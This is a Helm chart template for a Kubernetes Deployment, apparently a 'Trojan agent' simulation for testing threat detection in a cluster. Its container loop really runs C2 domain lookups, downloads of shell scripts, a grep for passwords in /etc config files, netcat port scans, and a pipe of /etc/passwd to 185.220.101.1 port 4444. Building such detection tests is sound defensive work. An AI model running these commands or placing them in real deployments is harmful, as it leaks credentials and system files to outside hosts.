{{- if .Values.agent.enabled -}}
apiVersion: apps/v1
kind: Deployment
metadata:
  name: {{ include "malicious-containers.fullname" . }}-agent
  labels:
    {{- include "malicious-containers.labels" . | nindent 4 }}
    app.kubernetes.io/component: agent
    kids-label: "1"
spec:
  replicas: {{ .Values.agent.replicas | default 1 }}
  selector:
    matchLabels:
      {{- include "malicious-containers.selectorLabels" . | nindent 6 }}
      app.kubernetes.io/component: agent
  template:
    metadata:
      labels:
        {{- include "malicious-containers.selectorLabels" . | nindent 8 }}
        app.kubernetes.io/component: agent
        kids-label: "1"
    spec:
      {{- with .Values.nodeSelector }}
      nodeSelector:
        {{- toYaml . | nindent 8 }}
      {{- end }}
      {{- with .Values.tolerations }}
      tolerations:
        {{- toYaml . | nindent 8 }}
      {{- end }}
      containers:
        - name: agent
          image: {{ .Values.agent.image }}
          command: ["/bin/sh", "-c"]
          args:
            - |
              apk add --no-cache curl wget nmap-ncat bind-tools
              echo "Starting Trojan Agent simulation..."
              while true; do
                echo "[$(date)] Communicating with control server (simulated)..."
                nslookup malicious-c2.internal || true
                nslookup evil.com || true
                
                echo "[$(date)] Downloading deceptive file 'update_pkg.sh'..."
                wget -O /tmp/update_pkg.sh http://malicious-c2.internal/update.sh 2>/dev/null || echo "Download failed (simulated)"
                curl -s http://185.220.101.1/payload.sh -o /tmp/payload.sh || true
                
                echo "[$(date)] Executing disguised program..."
                cp /bin/ls /tmp/systemd-service
                chmod +x /tmp/systemd-service
                /tmp/systemd-service -la /root 2>/dev/null || true
                
                echo "[$(date)] Unauthorized resource use (scanning)..."
                find /etc -name "*.conf" 2>/dev/null | head -10 | xargs grep "password" 2>/dev/null || true
                
                echo "[$(date)] Network scanning..."
                nc -zv -w 1 10.0.0.1 22 2>&1 || true
                nc -zv -w 1 10.0.0.1 80 2>&1 || true
                
                echo "[$(date)] Data exfiltration simulation..."
                cat /etc/passwd | nc -w 1 185.220.101.1 4444 2>&1 || true
                
                sleep 30
              done
{{- end }}
